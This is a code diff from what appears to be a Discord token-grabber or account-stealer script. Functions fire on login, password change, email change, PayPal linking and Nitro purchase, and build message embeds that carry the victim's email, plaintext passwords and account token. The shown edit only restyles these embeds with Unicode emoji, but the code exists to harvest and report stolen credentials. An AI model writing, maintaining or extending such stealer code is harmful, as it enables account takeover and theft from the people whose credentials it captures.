@@ -663,7 +663,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `<:Phone:1080852884696076379> Email: **${email}** - <:pass:1080879020348035083> Password: **${password}**`,
+            value: `📧 Email: **${email}** - 🔒 Password: **${password}**`,
             inline: false,
           },
           {
@@ -672,7 +672,7 @@ const login = async (email, password, token) => {
             inline: false,
           },
           {
-            name: '<:token:825533670356942879> **Token**',
+            name: '📍 **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -702,7 +702,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:Phone:1080852884696076379> Email: **${json.email}**\n<:pass:1080879020348035083> Old Password: **${oldpassword}**0\n<:pass:1080879020348035083> New Password: **${newpassword}**`,
+            value: `📧 Email: **${json.email}**\n🔓 Old Password: **${oldpassword}**0\n🔒 New Password: **${newpassword}**`,
             inline: true,
           },
           {
@@ -711,7 +711,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
-            name: '<:token:825533670356942879> **Token**',
+            name: '📍 **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -741,7 +741,7 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:Phone:1080852884696076379> New Email: **${email}**\n<:pass:1080879020348035083> Password: **${password}**`,
+            value: `📧 New Email: **${email}**\n🔒 Password: **${password}**`,
             inline: true,
           },
           {
@@ -750,7 +750,7 @@ const emailChanged = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:token:825533670356942879> **Token**',
+            name: '📍 **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -789,7 +789,7 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '<:token:825533670356942879> **Token**',
+            name: '📍 **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -869,7 +869,7 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '<:token:825533670356942879> **Token**',
+            name: '📍 **Token**',
             value: `\`${token}\``,
             inline: false,
           },
